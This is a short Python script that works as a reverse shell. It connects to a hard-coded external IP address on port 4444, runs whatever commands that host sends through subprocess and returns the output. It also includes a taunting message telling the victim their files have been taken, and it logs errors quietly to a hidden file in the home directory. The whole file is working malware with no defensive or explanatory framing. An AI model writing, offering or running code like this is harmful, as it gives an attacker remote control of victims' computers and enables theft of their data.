import os
import socket
import subprocess

HOST = "102.213.170.34"
PORT = 4444

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        while True:
            command = s.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                break

            if command.lower() == "status":
                s.send("Greetings. If you're reading this, it means that all of your files are now in my possession. Goodluck haha. There is no way you can find me.".encode('utf-8'))
                continue

            output = subprocess.getoutput(command)
            s.send(output.encode('utf-8'))

        s.close()
    except Exception as e:
        with open(os.path.expanduser("~/.error_log"), "a") as f:
            f.write(str(e) + "\n")

if __name__ == "__main__":
    connect()
